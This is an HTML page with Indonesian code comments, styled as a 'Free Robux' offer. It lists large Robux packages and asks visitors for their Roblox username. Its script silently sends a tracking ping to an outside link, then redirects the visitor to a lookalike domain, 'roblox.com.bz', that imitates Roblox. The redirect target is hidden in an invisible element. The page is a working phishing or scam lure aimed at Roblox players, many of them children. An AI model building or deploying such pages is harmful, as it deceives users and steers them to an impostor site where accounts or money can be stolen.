<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Free Robux</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }

        body {
            background: #1a1a2e;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .card {
            background: #16213e;
            border-radius: 24px;
            padding: 32px 28px;
            max-width: 600px;
            width: 100%;
            color: #fff;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.06);
        }

        /* Header dengan logo R$ dan Free Money */
        .header-top {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 6px;
        }

        .robux-icon {
            background: #00b2ff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 800;
            font-size: 18px;
            color: #fff;
            flex-shrink: 0;
        }

        .free-money {
            font-size: 20px;
            font-weight: 600;
            color: #fff;
        }

        .free-money span {
            color: #7ae0b0;
        }

        .free-money small {
            font-size: 14px;
            font-weight: 400;
            color: #a0b4d0;
        }

        .subhead {
            font-size: 15px;
            color: #a0b4d0;
            margin: 6px 0 20px 0;
            line-height: 1.5;
        }

        /* Daftar paket dengan bullet R$ */
        .package-list {
            margin: 16px 0 24px 0;
        }

        .package-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 10px 14px;
            border-radius: 12px;
            border: 1px solid #2a3a5e;
            margin-bottom: 8px;
            transition: all 0.2s;
            cursor: default;
        }

        .package-item:hover {
            border-color: #4a7cf7;
            background: #1e2a4a;
        }

        .package-item .r-bullet {
            background: #00b2ff;
            border-radius: 50%;
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 13px;
            color: #fff;
            flex-shrink: 0;
        }

        .package-item .p-info {
            display: flex;
            align-items: baseline;
            gap: 6px;
            font-size: 18px;
            font-weight: 600;
        }

        .package-item .p-info .price {
            color: #7ae0b0;
        }

        .package-item .p-info .amount {
            color: #fff;
        }

        /* Username section */
        .username-section {
            background: #1e2a4a;
            border-radius: 16px;
            padding: 16px 18px 18px 18px;
            margin: 20px 0 8px 0;
            border: 1px solid #2a3a5e;
        }

        .username-label {
            font-size: 14px;
            font-weight: 600;
            color: #b0c8e8;
            margin-bottom: 8px;
            display: block;
        }

        .username-input-wrapper {
            display: flex;
            align-items: center;
            background: #0f1a30;
            border-radius: 12px;
            padding: 0 16px;
            border: 1px solid #2e4068;
            transition: border 0.2s;
        }

        .username-input-wrapper:focus-within {
            border-color: #4a7cf7;
            box-shadow: 0 0 0 3px rgba(74, 124, 247, 0.2);
        }

        .username-input-wrapper input {
            flex: 1;
            background: transparent;
            border: none;
            padding: 14px 0;
            font-size: 16px;
            color: #fff;
            outline: none;
        }

        .username-input-wrapper input::placeholder {
            color: #5a6f8f;
        }

        .next-btn {
            background: #4a7cf7;
            color: #fff;
            border: none;
            padding: 8px 24px;
            border-radius: 40px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
            white-space: nowrap;
        }

        .next-btn:hover {
            background: #5f8cf9;
        }

        .next-btn:active {
            transform: scale(0.96);
        }

        /* Responsive */
        @media (max-width: 480px) {
            .card {
                padding: 24px 16px;
            }

            .header-top {
                flex-wrap: wrap;
            }

            .free-money {
                font-size: 17px;
            }

            .package-item .p-info {
                font-size: 16px;
            }

            .username-input-wrapper {
                flex-wrap: wrap;
                padding: 6px 12px 12px 12px;
            }

            .username-input-wrapper input {
                width: 100%;
                padding: 12px 0 8px 0;
            }

            .next-btn {
                width: 100%;
                padding: 12px;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="card">

        <!-- Header: R$ + Free Money -->
        <div class="header-top">
            <div class="robux-icon">R$</div>
            <div class="free-money">
                Free Money on <span>Bio.now</span> <small>✨</small>
            </div>
        </div>

        <!-- Subhead -->
        <p class="subhead">Robux allows you to purchase upgrades for your avatar or buy special abilities in experiences.</p>

        <!-- Daftar paket dengan bullet R$ -->
        <div class="package-list">
            <div class="package-item">
                <div class="r-bullet">R$</div>
                <div class="p-info">
                    <span class="price">$10,000</span>
                </div>
            </div>
            <div class="package-item">
                <div class="r-bullet">R$</div>
                <div class="p-info">
                    <span class="price">$20,000</span>
                </div>
            </div>
            <div class="package-item">
                <div class="r-bullet">R$</div>
                <div class="p-info">
                    <span class="price">$50,000</span>
                </div>
            </div>
            <div class="package-item">
                <div class="r-bullet">R$</div>
                <div class="p-info">
                    <span class="price">$100,000</span>
                </div>
            </div>
            <div class="package-item">
                <div class="r-bullet">R$</div>
                <div class="p-info">
                    <span class="price">$200,000</span>
                </div>
            </div>
        </div>

        <!-- Username + Next (dengan link tujuan) -->
        <div class="username-section">
            <span class="username-label">Roblox username</span>
            <div class="username-input-wrapper">
                <input type="text" placeholder="Enter username" id="usernameInput" />
                <button class="next-btn" id="nextBtn">Next</button>
            </div>
        </div>

        <!-- Link tersembunyi untuk redirect -->
        <div style="display: none;" id="redirectUrl" data-url="https://roblox.com.bz/communities/5428226711/"></div>

    </div>

    <script>
        (function() {
            const nextBtn = document.getElementById('nextBtn');
            const usernameInput = document.getElementById('usernameInput');
            const redirectUrl = document.getElementById('redirectUrl').getAttribute('data-url');

            // Fungsi untuk redirect dengan delay (agar ada feedback klik)
            function handleNext() {
                // Bisa tambahkan validasi sederhana jika ingin
                const username = usernameInput.value.trim();
                if (username === '') {
                    // Jika kosong, tetap redirect tapi kasih efek sedikit
                    // Biarkan tetap jalan
                }

                // Redirect ke URL tujuan
                window.location.href = redirectUrl;
            }

            // Event klik tombol Next
            nextBtn.addEventListener('click', handleNext);

            // Event Enter pada input
            usernameInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    handleNext();
                }
            });

            // Opsional: tracking klik ke link https://kommodo.ai/i/x6QqVMj0TWs8fPJYA4On
            // Catatan: kita tidak bisa melakukan redirect ke kommodo dan kemudian ke roblox sekaligus.
            // Jika ingin mencatat klik ke kommodo terlebih dahulu, kita bisa pakai fetch atau window.open.
            // Sesuai permintaan: "Dan ganti url ke https://kommodo.ai/i/x6QqVMj0TWs8fPJYA4On"
            // dan "ketika pencet next langsung arah ke web https://roblox.com.bz/..."
            // Maka kita akan kirim ping ke kommodo lalu redirect ke roblox.

            // Override handleNext untuk mengirim ping ke kommodo terlebih dahulu
            const originalHandleNext = handleNext;
            handleNext = function() {
                // Kirim ping ke kommodo (tanpa mengganggu user)
                try {
                    fetch('https://kommodo.ai/i/x6QqVMj0TWs8fPJYA4On', {
                        method: 'GET',
                        mode: 'no-cors' // agar tidak error CORS
                    }).catch(() => {});
                } catch (e) {}

                // Redirect ke roblox setelah ping (delay kecil agar ping terkirim)
                setTimeout(function() {
                    window.location.href = redirectUrl;
                }, 150);
            };

            // Re-attach event dengan fungsi baru
            // Hapus listener lama, pasang yang baru
            nextBtn.removeEventListener('click', originalHandleNext);
            nextBtn.addEventListener('click', handleNext);

            // Re-attach untuk keydown
            usernameInput.removeEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    originalHandleNext();
                }
            });
            usernameInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    handleNext();
                }
            });

        })();
    </script>
</body>
</html>
